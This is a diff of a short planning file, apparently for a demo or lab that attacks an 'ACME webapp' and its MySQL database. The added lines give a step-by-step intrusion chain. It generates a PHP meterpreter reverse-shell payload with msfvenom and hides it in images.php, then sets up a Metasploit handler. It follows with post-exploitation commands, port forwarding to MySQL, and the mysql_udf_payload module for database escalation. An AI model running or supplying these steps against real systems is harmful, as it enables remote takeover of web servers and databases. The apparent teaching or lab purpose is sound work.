@@ -1,5 +1,10 @@
-dba_plugins/src should contain the UDF source
-containers/mysql shoudl contain a build setup that builds all the udf functions in the above folder, before copying them to the global plguin directory
-try to find a data masking UDF to use as an example why the DBa's have this access
-get https://github.com/mysqludf/lib_mysqludf_sys building for the current DB version, or downgrade the DB version (though may be hard to find a 5.1 Arm64 build ... heh)
+1. Vulnerable entrypoint into stack is via /api/?action=
+2. msfvenom -p php/meterpreter/reverse_tcp LHOST=${MYIP} -e php/base64 -f raw  >> images.php
+3. stage this onto ACME webapp
+4. msfconsole; use multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST $MYIP; exploit;
+5. in another window use curl or a browser to land on the uploaded msfvenom staged payload
+6. back in msconsole; sysinfo; echo $pwd; ls; cat api/index.php; portfwd add -l 33306 -p 3306 -r mysql;
+7. new msfconsole; use multi/mysql/mysql_udf_payload; set RHOST $MYIP; set USERNAME $user; set PASSWORD $pass; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST $MYIP; (may not work UDF is geared towards < 5.5.9 @ Windows ...)
 
+
+FALLBACK: Talk to this video: https://www.youtube.com/watch?v=e29kbX-rx0s 
